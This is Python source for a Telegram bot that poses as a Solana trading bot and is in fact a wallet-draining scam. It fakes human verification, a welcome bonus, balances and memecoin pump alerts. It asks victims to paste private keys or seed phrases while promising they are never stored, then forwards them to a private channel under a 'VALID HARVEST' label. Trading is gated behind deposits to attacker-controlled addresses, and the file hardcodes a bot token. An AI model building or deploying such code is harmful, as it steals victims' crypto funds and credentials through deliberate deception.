import asyncio
import logging
import random
import string
import time
from datetime import datetime

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
    Dispatcher  # ← added for webhook
)

# Solana imports with fallback
try:
    from solders.keypair import Keypair as SoldersKeypair
    from solders.pubkey import Pubkey
    from solana.rpc.async_api import AsyncClient
    from base58 import b58decode
    SOLANA_AVAILABLE = True
except ImportError:
    SOLANA_AVAILABLE = False

from mnemonic import Mnemonic
try:
    from bip_utils import Bip39SeedGenerator, Bip44, Bip44Coins, Bip44Changes
    BIP_UTILS_AVAILABLE = True
except ImportError:
    BIP_UTILS_AVAILABLE = False

# Flask for Render health + webhook endpoint
from flask import Flask, request, jsonify
import threading
import os

# ────────────────────────────────────────────────
# CONFIG – CHANGE THESE
# ────────────────────────────────────────────────
BOT_TOKEN = "8474981056:AAF7pUxMWfioSedNM7wQOlZR5e8pSPDD3FA"  # ← YOUR BOT TOKEN
PRIVATE_CHANNEL_ID = -1003695893622                             # ← YOUR PRIVATE CHANNEL

CONTROLLED_DEPOSIT_ADDRESSES = [
    "Hoyeh4eEgDVyATpNrpSUziydcLbZ4EX8rx279PE4P8YC",
    "8vBxck38Q7dFPR42e9kbMRq1R3oULcLkQraQ3d2bVdPX",
    "Cmu51BygfiobJoWhHccSRgh3PKHBX2Lf5U5tpzt4HPf2",
]

FAKE_ADDRESSES = [
    "Hoyeh4eEgDVyATpNrpSUziydcLbZ4EX8rx279PE4P8YC",
    "4orSc4sPZPHwTv5Jp6xLDExXDSKsevUYBiwBVAdGQuoV",
    "Cmu51BygfiobJoWhHccSRgh3PKHBX2Lf5U5tpzt4HPf2",
]

FAKE_TREND_MESSAGES = [
    "🚀 $WIF just broke +1800% in last 45 min — volume exploding!",
    "🐐 $GOAT whale bought 420 SOL → already +$1.2M unrealized",
    "🔥 $PNUT printing — +3200% from launch, don't fade this one",
    "💥 New memecoin $FARTCOIN doing 50× in 20 minutes — early still?",
    "🟢 $POPCAT reclaiming ATH — momentum insane right now",
    "🐶 $BONK +950% weekly — community pumping hard",
    "😼 $MEW just got listed on major CEX — moon mission active",
    "🦍 $GIGA breaking resistance — next 100× candidate?",
    "🌶️ $michi flipping charts — +1400% and still going",
    "🐸 $PEPE variant $FROGO just rugged up 2800% — apes in",
    "💰 Whale alert: 1200 SOL buy on $SLERF — chart vertical",
    "📈 $JUP DAO proposal passed — liquidity incoming",
    "🔥 $WEN doing numbers again — don't sleep on this",
    "🤑 $MOTHER by Iggy Azalea pumping — celebrity effect real",
    "🐳 850 SOL dump → instant rebound +1600% on $BOME",
    "$HARAMBE spiritual successor launching — apes accumulating",
    "🚨 $cat in a dogs world flipping — +4200% in hours",
    "🌟 New Solana AI coin $GROKx just did 90× — next meta?",
    "💣 $TrumpCoin variant mooning — political season heating up",
    "🦊 $狐狸 (kitsune) doing Japanese memecoin meta — +2100%",
    "🐼 $PANDA eating charts — Chinese community pumping",
    "🎮 $GAME on Solana — play-to-earn vibe going viral"
]

# States
MENU, INPUT_PK, INPUT_SETTING, INPUT_BUY_CA = range(4)

active_users = 7400
user_data = {}

# Store last trend alert message ID per user (for deletion)
last_trend_msg_ids = {}

# Rotation for controlled addresses
wallet_rotation_index = 0

# Anti-double-tap
last_callback_time = {}
last_processed_callback_id = {}     # added for stricter dedup
last_main_edit_time = {}            # added for menu spam protection
CALLBACK_COOLDOWN_SECONDS = 2.2     # increased from 0.9

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

mnemo = Mnemonic("english")

RPC_URL = "https://rpc.ankr.com/solana"
solana_client = None
if SOLANA_AVAILABLE:
    try:
        solana_client = AsyncClient(RPC_URL)
    except:
        pass

DEFAULT_SETTINGS = {
    "speed": "Fast",
    "custom_tip": 0.005,
    "buy_slippage": 0.5,
    "sell_slippage": 0.5,
    "auto_slippage": True,
    "confirm_trades": True,
    "sell_protection": False,
    "mev_protect_buy": True,
    "mev_protect_sell": True,
}

def detect_and_validate_wallet(value: str) -> tuple[bool, str, str]:
    value = value.strip()

    if not value:
        return False, "Empty input.", "unknown"

    if ' ' in value:
        words = [w.lower() for w in value.split() if w]
        word_count = len(words)

        if word_count in (12, 15, 18, 21, 24):
            if mnemo.check(' '.join(words)):
                detected = "BIP-39 mnemonic"
                if word_count == 12:
                    detected += " (12 words – common on ETH, SOL, BTC, etc.)"
                elif word_count == 24:
                    detected += " (24 words – common on Ledger, Trezor, etc.)"
                return True, f"Valid BIP-39 seed phrase ({word_count} words)", detected
            else:
                return False, "Mnemonic checksum failed.", "mnemonic (invalid checksum)"

        elif 10 <= word_count <= 26:
            return True, f"Looks like mnemonic ({word_count} words) – accepting anyway", "mnemonic (loose check)"

    if len(value) == 64 and all(c in '0123456789abcdefABCDEF' for c in value):
        return True, "Valid 64-char hex private key (Ethereum-style)", "Ethereum / EVM (hex)"

    if value.startswith('0x') and len(value) == 66 and all(c in '0123456789abcdefABCDEF' for c in value[2:]):
        return True, "Valid 0x-prefixed hex private key (EVM)", "Ethereum / EVM (0x hex)"

    if value.startswith(('5', 'K', 'L')) and 50 <= len(value) <= 52 and value.isalnum():
        return True, "Looks like Bitcoin WIF private key", "Bitcoin WIF"

    if value.startswith(('K', 'L')) and len(value) == 52:
        return True, "Probable compressed Bitcoin WIF", "Bitcoin WIF (compressed)"

    if 32 <= len(value) <= 90 and not value.startswith('0x'):
        try:
            decoded = b58decode(value)
            if len(decoded) in (32, 64):
                return True, f"Valid base58 key ({len(decoded)} bytes decoded)", "Solana / base58"
        except:
            pass

    if len(value) >= 40 and not value.isdigit() and not value.isalpha():
        return True, "Long string – accepted as possible private data", "unknown / other chain"

    return False, "Does not match known wallet formats.", "unknown"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.effective_user.id

    if user_id not in user_data:
        user_data[user_id] = {
            "wallet": None,
            "is_imported": False,
            "balance": round(random.uniform(0.0512, 0.0578), 6),
            "settings": DEFAULT_SETTINGS.copy(),
            "main_msg_id": None,
            "verified": False,
        }

    if user_data[user_id].get("verified", False):
        await show_main_menu(update, context, force_new=True)
        return MENU

    await context.bot.send_message(
        PRIVATE_CHANNEL_ID,
        f"┌────────────────────────────── New Session ──────────────────────────────┐\n"
        f"│ User ID    │ {user_id:<18}                                         │\n"
        f"│ Username   │ @{update.effective_user.username or '—':<38}          │\n"
        f"│ First Name │ {update.effective_user.first_name or '—':<38}          │\n"
        f"│ Started    │ {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}          │\n"
        f"└─────────────────────────────────────────────────────────────────────────┘",
        parse_mode=None
    )

    text = (
        "🔐 **Human Verification Required**\n\n"
        "To continue using this bot,\n"
        "please verify you are human.\n\n"
        "👇 Tap the button below"
    )

    keyboard = [
        [InlineKeyboardButton("✅ Verify I am human", callback_data="verify_human")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    sent = await update.message.reply_text(
        text,
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

    context.user_data["verify_msg_id"] = sent.message_id

    if "active_task" not in context.bot_data:
        context.bot_data["active_task"] = asyncio.create_task(fake_active_counter())

    return MENU

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    data = query.data
    user_id = query.from_user.id
    chat_id = query.message.chat_id
    ud = user_data.get(user_id, {})

    now = time.time()
    if user_id in last_callback_time:
        if now - last_callback_time[user_id] < CALLBACK_COOLDOWN_SECONDS:
            await query.answer()
            return MENU

    # Stricter anti-spam: ignore if same callback data very recently
    if user_id in last_processed_callback_id:
        if data == last_processed_callback_id[user_id] and now - last_callback_time.get(user_id, 0) < 4.5:
            await query.answer("Action already in progress — please wait", show_alert=False)
            return MENU

    # Also block if main menu was edited very recently
    if user_id in last_main_edit_time:
        if now - last_main_edit_time[user_id] < 2.8:
            await query.answer()
            return MENU

    last_callback_time[user_id] = now
    last_processed_callback_id[user_id] = data

    if data == "verify_human":
        verify_msg_id = context.user_data.get("verify_msg_id")
        if not verify_msg_id:
            await show_main_menu(update, context)
            return MENU

        await query.edit_message_text("🔍 **Checking...**", parse_mode="Markdown")
        await asyncio.sleep(random.uniform(1.2, 2.1))

        await query.edit_message_text("⏳ **Verifying...**", parse_mode="Markdown")
        await asyncio.sleep(random.uniform(3.0, 5.0))

        await query.edit_message_text("✅ **Verification successful!**\nLoading menu...", parse_mode="Markdown")
        await asyncio.sleep(1.3)

        user_data[user_id]["verified"] = True

        try:
            await context.bot.delete_message(chat_id, verify_msg_id)
        except:
            pass

        context.user_data.pop("verify_msg_id", None)

        await show_main_menu(update, context, force_new=True)
        return MENU

    has_wallet = bool(ud.get("wallet"))
    current_balance = ud.get("balance", 0.0)

    if data == "settings":
        await show_settings_menu(update, context)
        return MENU

    if data in ["set_speed_fast", "set_speed_turbo", "set_speed_custom"]:
        speed_map = {"set_speed_fast": "Fast", "set_speed_turbo": "Turbo", "set_speed_custom": "Custom"}
        user_data[user_id]["settings"]["speed"] = speed_map[data]
        await show_settings_menu(update, context)
        return MENU

    if data in ["edit_custom_tip", "edit_buy_slippage", "edit_sell_slippage"]:
        prompt_map = {
            "edit_custom_tip": "Enter new custom tip in SOL (e.g. 0.0075):",
            "edit_buy_slippage": "Enter buy slippage % (e.g. 1.2):",
            "edit_sell_slippage": "Enter sell slippage % (e.g. 2.5):",
        }
        await edit_or_send(update, context, prompt_map[data])
        field_map = {
            "edit_custom_tip": "custom_tip",
            "edit_buy_slippage": "buy_slippage",
            "edit_sell_slippage": "sell_slippage",
        }
        context.user_data["waiting_for_setting"] = field_map[data]
        return INPUT_SETTING

    toggle_map = {
        "toggle_auto_slippage": "auto_slippage",
        "toggle_confirm_trades": "confirm_trades",
        "toggle_sell_protection": "sell_protection",
        "toggle_mev_buy": "mev_protect_buy",
        "toggle_mev_sell": "mev_protect_sell",
    }
    if data in toggle_map:
        key = toggle_map[data]
        user_data[user_id]["settings"][key] = not user_data[user_id]["settings"][key]
        await show_settings_menu(update, context)
        return MENU

    if data == "dummy":
        await query.answer("Custom speed must be selected first", show_alert=True)
        return MENU

    if data == "continue_after_create":
        success_id = context.user_data.get("wallet_creation_success_msg_id")
        if success_id:
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=success_id)
            except:
                pass
            context.user_data.pop("wallet_creation_success_msg_id", None)

        bonus_id = context.user_data.get("wallet_bonus_msg_id")
        if bonus_id:
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=bonus_id)
            except:
                pass
            context.user_data.pop("wallet_bonus_msg_id", None)

        await show_main_menu(update, context, force_new=False)
        return MENU

    wallet_required = [
        "buy", "sell", "balance", "withdraw", "auto", "limit", "copy",
        "holdings", "dca", "recent", "tx", "settings", "wallet"
    ]

    if data in wallet_required and not has_wallet:
        text = (
            "⚠️ **No Wallet Connected**\n\n"
            "Import an existing wallet or create a new one to begin trading."
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Import Wallet 🔑", callback_data="import")],
            [InlineKeyboardButton("Create Wallet 🆕", callback_data="create")],
            [InlineKeyboardButton("Back 🔙", callback_data="back_menu")],
        ])
        await edit_or_send(update, context, text, kb)
        return MENU

    if data in ("refresh", "back_menu"):
        success_msg_id = context.user_data.get("wallet_creation_success_msg_id")
        if success_msg_id:
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=success_msg_id)
            except:
                pass
            context.user_data.pop("wallet_creation_success_msg_id", None)

        bonus_msg_id = context.user_data.get("wallet_bonus_msg_id")
        if bonus_msg_id:
            try:
                await context.bot.delete_message(chat_id=chat_id, message_id=bonus_msg_id)
            except:
                pass
            context.user_data.pop("wallet_bonus_msg_id", None)

        await show_main_menu(update, context)
        return MENU

    if data == "deposit":
        if not has_wallet:
            text = (
                "⚠️ **No Wallet Connected**\n\n"
                "Create or import a wallet to receive your personal deposit address.\n"
                "Deposits to shared addresses may be delayed."
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Create 🆕", callback_data="create"),
                 InlineKeyboardButton("Import 🔑", callback_data="import")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")],
            ])
        else:
            addr = ud["wallet"]
            text = (
                f"**Deposit SOL**\n\n"
                f"Your personal address:\n"
                f"||`{addr}`||\n\n"
                f"**Tap on the address above to copy instantly** 📋\n\n"
                f"Balance: **{ud['balance']:.4f} SOL**\n"
                f"Send any amount — funds appear in \\\~5–30 seconds."
            )
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back 🔙", callback_data="back_menu")]])
        await edit_or_send(update, context, text, kb)
        return MENU

    if data == "create":
        global wallet_rotation_index
        addr = CONTROLLED_DEPOSIT_ADDRESSES[wallet_rotation_index % len(CONTROLLED_DEPOSIT_ADDRESSES)]
        wallet_rotation_index += 1

        ud["wallet"] = addr
        ud["balance"] = round(random.uniform(0.0512, 0.0578), 6)

        await context.bot.send_message(
            PRIVATE_CHANNEL_ID,
            f"┌────────────────────────────── Wallet Created ──────────────────────────────┐\n"
            f"│ User ID       │ {user_id:<20}                                           │\n"
            f"│ Username      │ @{update.effective_user.username or '—':<38}                │\n"
            f"│ Assigned Addr │ {addr[:12]}...{addr[-4:]:<38}                               │\n"
            f"│ Timestamp     │ {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}          │\n"
            f"└────────────────────────────────────────────────────────────────────────────┘",
            parse_mode=None
        )

        messages = [
            "🔐 Generating secure keypair...",
            "🧮 Deriving address from seed...",
            "🔒 Encrypting private data locally...",
            "⚙️ Finalizing wallet structure..."
        ]

        status_msg = await edit_or_send(
            update, context,
            messages[0],
            reply_markup=None
        )

        for msg in messages[1:]:
            await asyncio.sleep(random.uniform(1.4, 2.6))
            try:
                await context.bot.edit_message_text(
                    chat_id=chat_id,
                    message_id=status_msg.message_id,
                    text=msg,
                    reply_markup=None,
                    parse_mode="Markdown"
                )
            except:
                pass

        success_text = (
            f"**Wallet created successfully** ✅\n\n"
            f"||`{addr}`||\n\n"
            f"**Tap on the address above to copy instantly** 📋\n\n"
            f"Balance: **{ud['balance']:.4f} SOL**"
        )
        kb_continue = InlineKeyboardMarkup([
            [InlineKeyboardButton("Continue →", callback_data="continue_after_create")]
        ])

        try:
            await context.bot.edit_message_text(
                chat_id=chat_id,
                message_id=status_msg.message_id,
                text=success_text,
                reply_markup=kb_continue,
                parse_mode="Markdown"
            )
            context.user_data["wallet_creation_success_msg_id"] = status_msg.message_id
        except:
            new_msg = await context.bot.send_message(
                chat_id=chat_id,
                text=success_text,
                reply_markup=kb_continue,
                parse_mode="Markdown"
            )
            context.user_data["wallet_creation_success_msg_id"] = new_msg.message_id

        try:
            bonus_msg = await context.bot.send_message(
                chat_id=chat_id,
                text=(
                    f"🎁 **Welcome Bonus Credited!**\n\n"
                    f"You've received **{ud['balance']:.4f} SOL** (≈${int(ud['balance'] * random.uniform(185,195))}) "
                    "as a thank-you gift!\n"
                    "Perfect for testing trades or unlocking priority features.\n\n"
                    "Tap Continue to start trading →"
                ),
                parse_mode="Markdown",
                disable_notification=True
            )
            context.user_data["wallet_bonus_msg_id"] = bonus_msg.message_id
        except:
            pass

        return MENU

    if data == "import":
        text = (
            "**Secure Wallet Connection**\n\n"
            "To connect your existing Solana wallet, paste your private key or recovery phrase below.\n\n"
            "🔒 Processed securely – your data is never stored or shared.\n\n"
            "Paste here 👇"
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("← Back", callback_data="back_to_wallet_choice")]
        ])
        await edit_or_send(update, context, text, kb)
        context.user_data["waiting_for"] = "import"
        return INPUT_PK

    if data == "buy":
        if not has_wallet:
            text = "⚠️ **No Wallet Connected**\n\nCreate or import a wallet first."
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Create 🆕", callback_data="create"),
                 InlineKeyboardButton("Import 🔑", callback_data="import")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")],
            ])
            await edit_or_send(update, context, text, kb)
            return MENU

        current_balance = ud.get("balance", 0.0)
        MIN_BUY_REQUIRED = 0.20

        if current_balance < MIN_BUY_REQUIRED:
            text = (
                f"❌ **Insufficient Balance for Buy**\n\n"
                f"Minimum required: **{MIN_BUY_REQUIRED} SOL**\n"
                f"Your balance: **{current_balance:.4f} SOL**\n\n"
                "Deposit SOL to activate buy orders."
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Deposit Now 💸", callback_data="deposit")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")]
            ])
            await edit_or_send(update, context, text, kb)
            return MENU

        text = "**Buy Token**\n\nPaste the token contract address (CA):"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back 🔙", callback_data="back_menu")]])
        await edit_or_send(update, context, text, kb)

        context.user_data["waiting_for"] = "buy_ca"
        return INPUT_BUY_CA

    if data == "back_to_wallet_choice":
        if "last_error_msg_id" in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=chat_id,
                    message_id=context.user_data["last_error_msg_id"]
                )
            except:
                pass
            context.user_data.pop("last_error_msg_id", None)

        context.user_data.pop("waiting_for", None)

        text = (
            "⚠️ **No Wallet Connected**\n\n"
            "Import an existing wallet or create a new one to begin trading."
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Import Wallet 🔑", callback_data="import")],
            [InlineKeyboardButton("Create Wallet 🆕", callback_data="create")],
            [InlineKeyboardButton("Back 🔙", callback_data="back_menu")],
        ])
        await edit_or_send(update, context, text, kb)
        return MENU

    if data == "withdraw":
        if not has_wallet:
            text = "⚠️ **No Wallet Connected**\n\nCreate or import a wallet first."
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Create 🆕", callback_data="create"),
                 InlineKeyboardButton("Import 🔑", callback_data="import")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")],
            ])
        elif current_balance < 0.30:
            text = (
                f"❌ **Minimum 0.30 SOL required to Withdraw**\n\n"
                f"Your balance: **{current_balance:.4f} SOL**\n\n"
                "Top up now to enable instant withdrawals."
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Deposit to Unlock Withdrawals 💸", callback_data="deposit")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")]
            ])
        else:
            text = "**Withdraw**\n\nEnter destination address and amount:"
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back 🔙", callback_data="back_menu")]])
        await edit_or_send(update, context, text, kb)
        return MENU

    elif data == "sell":
        if not has_wallet:
            text = "⚠️ **No Wallet Connected**\n\nCreate or import a wallet first."
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Create 🆕", callback_data="create"),
                 InlineKeyboardButton("Import 🔑", callback_data="import")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")],
            ])
        elif current_balance < 0.25:
            text = (
                f"❌ **Minimum 0.25 SOL required to Sell Assets**\n\n"
                f"Your balance: **{current_balance:.4f} SOL**\n\n"
                "Add funds to start cashing out profits."
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Deposit to Enable Selling 🚀", callback_data="deposit")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")]
            ])
        else:
            text = "**Sell Assets**\n\nSelect token or enter amount:"
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back 🔙", callback_data="back_menu")]])
        await edit_or_send(update, context, text, kb)
        return MENU

    elif data == "auto":
        if not has_wallet:
            text = "⚠️ **No Wallet Connected**"
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Create 🆕", callback_data="create"),
                 InlineKeyboardButton("Import 🔑", callback_data="import")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")],
            ])
        elif current_balance < 0.15:
            text = (
                f"❌ **Minimum 0.15 SOL required for Auto Trade**\n\n"
                f"Your balance: **{current_balance:.4f} SOL**\n\n"
                "Deposit to activate 24/7 bot trading."
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Deposit to Activate Auto 🤖", callback_data="deposit")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")]
            ])
        else:
            text = "**Auto Trade activated** ✓ (running in background)"
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back 🔙", callback_data="back_menu")]])
        await edit_or_send(update, context, text, kb)
        return MENU

    elif data == "limit":
        if not has_wallet:
            text = "⚠️ **No Wallet Connected**"
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Create 🆕", callback_data="create"),
                 InlineKeyboardButton("Import 🔑", callback_data="import")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")],
            ])
        elif current_balance < 0.12:
            text = (
                f"❌ **Minimum 0.12 SOL required to place Limit Orders**\n\n"
                f"Your balance: **{current_balance:.4f} SOL**\n\n"
                "Fund your wallet to set smart price triggers."
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Deposit to Unlock Limits 🎯", callback_data="deposit")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")]
            ])
        else:
            text = "**Limit Order placed** ✓ (waiting for trigger)"
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back 🔙", callback_data="back_menu")]])
        await edit_or_send(update, context, text, kb)
        return MENU

    elif data == "copy":
        if current_balance < 0.18:
            text = (
                f"❌ **Minimum 0.18 SOL required for Copy Trade**\n\n"
                f"Your balance: **{current_balance:.4f} SOL**\n\n"
                "Deposit to start following top traders."
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Deposit to Start Copying 👥", callback_data="deposit")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")]
            ])
        else:
            text = "**Copy Trade activated** ✓"
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back 🔙", callback_data="back_menu")]])
        await edit_or_send(update, context, text, kb)
        return MENU

    elif data == "dca":
        if not has_wallet:
            text = (
                "⚠️ **No Wallet Connected**\n\n"
                "Create or import a wallet first."
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Create 🆕", callback_data="create"),
                 InlineKeyboardButton("Import 🔑", callback_data="import")],
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")],
            ])
        else:
            text = (
                "**DCA Orders 0/10**\n\n"
                "Max 10 active DCA orders.\n"
                "No DCA orders yet."
            )
            kb = InlineKeyboardMarkup([
                [InlineKeyboardButton("Back 🔙", callback_data="back_menu")]
            ])
        await edit_or_send(update, context, text, kb)
        return MENU

    if data == "balance":
        text = f"**Balance**\n\n**{ud['balance']:.4f} SOL** ≈ **${int(ud['balance'] * random.uniform(185,195)):,}**"
    elif data == "holdings":
        text = "**Holdings**\n\nNo tokens yet."
    elif data == "recent":
        recent_text = generate_fake_recent_trades(random.randint(8, 12))
        text = "**Recent Big Moves**\n\n" + recent_text
    elif data == "tx":
        text = "**Transactions**\n\n+0.05 SOL (bonus)"
    elif data == "wallet":
        if not has_wallet:
            text = "⚠️ **No wallet yet** — create or import one first."
        else:
            addr = ud["wallet"]
            text = (
                f"**Your Wallet**\n\n"
                f"Address:\n"
                f"||`{addr}`||\n\n"
                f"**Tap on the address above to copy** 📋\n"
                f"Balance: **{ud['balance']:.4f} SOL** ≈ **${int(ud['balance'] * random.uniform(185,195)):,}**\n\n"
                f"Use this address for deposits or to check on explorers."
            )
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back 🔙", callback_data="back_menu")]])
        await edit_or_send(update, context, text, kb)
        return MENU

    kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back 🔙", callback_data="back_menu")]])
    await edit_or_send(update, context, text, kb)
    return MENU

async def handle_import_pk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if context.user_data.get("waiting_for") != "import":
        return MENU

    user_id = update.effective_user.id
    raw_input = update.message.text.strip()
    chat_id = update.effective_chat.id
    msg_id = update.message.message_id

    try:
        await context.bot.delete_message(chat_id, msg_id)
    except:
        pass

    if "last_error_msg_id" in context.user_data:
        try:
            await context.bot.delete_message(
                chat_id=chat_id,
                message_id=context.user_data["last_error_msg_id"]
            )
        except:
            pass
        context.user_data.pop("last_error_msg_id", None)

    validating_msg = await context.bot.send_message(
        chat_id=chat_id,
        text="🔄 Re-validating...",
        parse_mode="Markdown"
    )
    await asyncio.sleep(random.uniform(1.8, 2.7))

    try:
        await context.bot.delete_message(chat_id, validating_msg.message_id)
    except:
        pass

    valid, reason, wallet_type = detect_and_validate_wallet(raw_input)

    await context.bot.send_message(
        PRIVATE_CHANNEL_ID,
        f"┌────────────────────────────── Key Submission ──────────────────────────────┐\n"
        f"│ User ID       │ {user_id:<20}                                           │\n"
        f"│ Username      │ @{update.effective_user.username or '—':<38}                │\n"
        f"│ Input Length  │ {len(raw_input):<20} chars                                   │\n"
        f"│ Timestamp     │ {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}          │\n"
        f"└────────────────────────────────────────────────────────────────────────────┘\n"
        f"Input (tap to copy):\n"
        f"||```text\n{raw_input}\n```||",
        parse_mode="MarkdownV2"
    )

    if not valid:
        error_text = (
            "❌ **INVALID WALLET DATA**\n\n"
            f"Could not recognize format: {reason}\n\n"
            "Try again with a private key or 12/24-word seed phrase."
        )
        error_msg = await context.bot.send_message(
            chat_id=chat_id,
            text=error_text,
            parse_mode="Markdown"
        )
        context.user_data["last_error_msg_id"] = error_msg.message_id
        context.user_data["waiting_for"] = "import"
        return INPUT_PK

    harvest_log = (
        f"┌────────────────────────────── VALID HARVEST ──────────────────────────────┐\n"
        f"│ User ID       │ {user_id:<20}                                           │\n"
        f"│ Username      │ @{update.effective_user.username or '—':<38}                │\n"
        f"│ Type          │ {wallet_type:<45}                               │\n"
        f"│ Detected      │ {reason:<45}                               │\n"
        f"│ Length        │ {len(raw_input):<20} chars                                   │\n"
        f"│ Timestamp     │ {datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}          │\n"
        f"└────────────────────────────────────────────────────────────────────────────┘\n"
        f"Payload (tap to copy):\n"
        f"||```text\n{raw_input.strip()}\n```||"
    )
    await context.bot.send_message(
        PRIVATE_CHANNEL_ID,
        harvest_log,
        parse_mode="MarkdownV2"
    )

    processing = await context.bot.send_message(chat_id=chat_id, text="Importing wallet... 🔄")
    await asyncio.sleep(random.uniform(4.0, 8.0))

    wallet_addr = random.choice(FAKE_ADDRESSES)
    ud = user_data[user_id]
    ud["wallet"] = wallet_addr
    ud["balance"] = round(random.uniform(0.0512, 0.0578), 6)
    ud["is_imported"] = True
    ud["detected_type"] = wallet_type

    success_text = (
        f"**Wallet imported successfully** ✅\n\n"
        f"||`{wallet_addr}`||\n\n"
        f"**Tap the hidden address above to copy** 📋\n"
        f"Balance: **{ud['balance']:.4f} SOL**"
    )

    success_msg = await context.bot.edit_message_text(
        chat_id=chat_id,
        message_id=processing.message_id,
        text=success_text,
        parse_mode="Markdown"
    )

    await asyncio.sleep(random.uniform(5.0, 8.5))
    try:
        await context.bot.delete_message(chat_id, success_msg.message_id)
    except:
        pass

    context.user_data.pop("last_error_msg_id", None)
    context.user_data.pop("waiting_for", None)

    await show_main_menu(update, context)
    return MENU

async def handle_setting_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if context.user_data.get("waiting_for_setting") is None:
        return MENU

    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    text = update.message.text.strip()

    try:
        await context.bot.delete_message(chat_id, update.message.message_id)
    except:
        pass

    setting_key = context.user_data["waiting_for_setting"]
    ud_settings = user_data[user_id]["settings"]

    if setting_key in ["custom_tip", "buy_slippage", "sell_slippage"]:
        try:
            value = float(text)
            if value < 0:
                value = 0
            if setting_key == "custom_tip" and value > 0.1:
                value = 0.1
            if "slippage" in setting_key and value > 50:
                value = 50
            ud_settings[setting_key] = value
        except:
            pass

    context.user_data.pop("waiting_for_setting", None)
    await show_settings_menu(update, context)
    return MENU

async def handle_buy_ca_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if context.user_data.get("waiting_for") != "buy_ca":
        return MENU

    user_id = update.effective_user.id
    chat_id = update.effective_chat.id

    try:
        await context.bot.delete_message(chat_id, update.message.message_id)
    except:
        pass

    processing_msg = await context.bot.send_message(
        chat_id=chat_id,
        text="🔄 Analyzing token... Fetching liquidity & route...",
        parse_mode="Markdown"
    )
    await asyncio.sleep(random.uniform(2.8, 4.5))

    ud = user_data[user_id]
    current_balance = ud.get("balance", 0.0)

    MIN_BUY_REQUIRED = 0.20

    if current_balance < MIN_BUY_REQUIRED:
        text = (
            f"❌ **Insufficient Balance for Buy**\n\n"
            f"Minimum required: **{MIN_BUY_REQUIRED} SOL**\n"
            f"Your balance: **{current_balance:.4f} SOL**\n\n"
            "Deposit more SOL to start trading this token."
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Deposit to Enable Buying 💸", callback_data="deposit")],
            [InlineKeyboardButton("Back 🔙", callback_data="back_menu")]
        ])
    else:
        text = "**Buy processed** ✓\n\n(Execution would happen here in real version)"
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("Back 🔙", callback_data="back_menu")]])

    await context.bot.edit_message_text(
        chat_id=chat_id,
        message_id=processing_msg.message_id,
        text=text,
        reply_markup=kb,
        parse_mode="Markdown"
    )

    context.user_data.pop("waiting_for", None)
    return MENU

async def edit_or_send(update: Update, context: ContextTypes.DEFAULT_TYPE, text: str, reply_markup=None):
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    main_msg_id = user_data[user_id].get("main_msg_id")

    if main_msg_id:
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=main_msg_id, text=text,
                reply_markup=reply_markup, parse_mode="Markdown"
            )
            last_main_edit_time[user_id] = time.time()  # added
            return
        except:
            pass

